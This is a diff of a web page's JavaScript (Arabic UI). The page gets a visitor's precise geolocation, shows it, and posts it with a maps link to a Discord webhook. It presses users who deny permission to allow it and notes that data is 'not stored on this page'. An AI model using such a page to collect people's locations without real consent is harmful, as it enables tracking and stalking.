@@ -111,49 +111,52 @@
 
     getBtn.addEventListener('click', () => {
       if (!('geolocation' in navigator)) {
-        setStatus('الرجاء المحاولة من متصفح اخر.', 'err');
+        setStatus('المتصفح لا يدعم تحديد الموقع الجغرافي.', 'err');
         return;
       }
 
       setStatus('طلب إذن تحديد الموقع…');
 
       navigator.geolocation.getCurrentPosition(
-        async pos => {
-          const { latitude, longitude, accuracy } = pos.coords;
-          const link = `https://maps.google.com/?q=${latitude},${longitude}`;
+  async pos => {
+    const { latitude, longitude, accuracy } = pos.coords;
+    const link = `https://maps.google.com/?q=${latitude},${longitude}`;
 
-          const data = {
-            latitude,
-            longitude,
-            accuracy,
-            timestamp: new Date(pos.timestamp).toISOString(),
-            maps_link: link,
-            note: 'لا يتم تخزين البيانات في هذه الصفحة. .'
-          };
+    const data = {
+      latitude,
+      longitude,
+      accuracy,
+      timestamp: new Date(pos.timestamp).toISOString(),
+      maps_link: link,
+      note: 'لا يتم تخزين البيانات في هذه الصفحة.'
+    };
 
-          // نعرض البيانات للمستخدم بشفافية
-          showData(data);
-          setStatus(`تم جلب الإحداثيات ✓ (~${Math.round(accuracy)}م دقة). جاري الإرسال …`);
+    // نعرض البيانات للمستخدم بشفافية
+    showData(data);
+    setStatus(`تم جلب الإحداثيات ✓ (~${Math.round(accuracy)}م دقة). جاري الإرسال …`);
 
-          try {
-            await sendDirectToDiscord(buildDiscordPayload(data));
-            setStatus('تم الإرسال بنجاح ✓', 'ok');
-          } catch (e) {
-            console.error(e);
-            if (isLikelyCORSError(e)) {
-              setStatus('فشل الإرسال: يبدو أنه تم حظر الطلب بسبب CORS. يُنصح باستخدام Proxy.', 'err');
-            } else {
-              setStatus(`فشل الإرسال إلى ديسكورد: ${e.message}`, 'err');
-            }
-          }
-        },
-        err => {
-          // أخطاء شائعة: رفض الإذن / نفاد الوقت / لا يوجد GPS
-          setStatus(`خطأ: ${err.message}`, 'err');
-          outEl.hidden = true;
-        },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
+    try {
+      await sendDirectToDiscord(buildDiscordPayload(data));
+      setStatus('تم الإرسال بنجاح ✓', 'ok');
+    } catch (e) {
+      console.error(e);
+      if (isLikelyCORSError(e)) {
+        setStatus('فشل الإرسال: يبدو أنه تم حظر الطلب بسبب CORS. يُنصح باستخدام Proxy.', 'err');
+      } else {
+        setStatus(`فشل الإرسال إلى ديسكورد: ${e.message}`, 'err');
+      }
+    }
+  },
+  err => {
+    if (err.code === err.PERMISSION_DENIED) {
+      setStatus("❌ يجب الضغط على 'السماح' للمتابعة", "err");
+    } else {
+      setStatus(`خطأ: ${err.message}`, "err");
+    }
+    outEl.hidden = true;
+  },
+  { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+);
     });
 
     clearBtn.addEventListener('click', () => {
